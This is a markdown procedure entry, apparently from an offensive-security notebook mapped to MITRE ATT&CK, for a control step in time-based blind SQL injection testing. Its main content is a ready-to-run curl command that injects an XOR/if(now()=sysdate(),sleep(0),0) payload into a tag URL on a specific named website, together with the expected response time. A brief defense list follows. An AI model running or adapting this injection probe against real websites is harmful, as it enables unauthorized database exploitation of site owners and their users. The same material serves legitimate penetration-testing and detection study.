---
id: proc-3
tags:
  - sqli
  - control-test
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-sqli-payload-sleep-0]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.902Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify Control Payload with No Delay

## Summary

This control procedure tests a non-delaying SQL payload to ensure delays are due to the sleep function and not other factors, confirming the injection mechanism.

## Description

Using sleep(0) in the same payload structure isolates the delay effect, maintaining the XOR comments for consistency. Normal response time reaffirms the baseline and validates that the injection point executes the payload without inherent delays.

## Requirements

1. Successful baseline and delay tests
2. Consistent HTTP client setup

## Defense

Defensive measures and detection strategies:

- Validate all inputs against expected patterns (e.g., alphanumeric tags)
- Implement query logging to spot conditional functions like if() or sleep()
- Use anomaly detection for response times

## Objectives

1. Rule out false positives in delay detection
2. Confirm payload structure acceptance
3. Establish reliable testing methodology

## Instructions

### Step 1: Send Control Payload

**Context**: Inject sleep(0) to match baseline timing.

**Command** ([[commands/curl-sqli-payload-sleep-0]]):
```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

> Expected: ~0.28s, matching baseline. No delay indicates sleep() control.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-payload-sleep-0]]

## Tools Used


## Tags

- [[sqli]]
- [[control-test]]
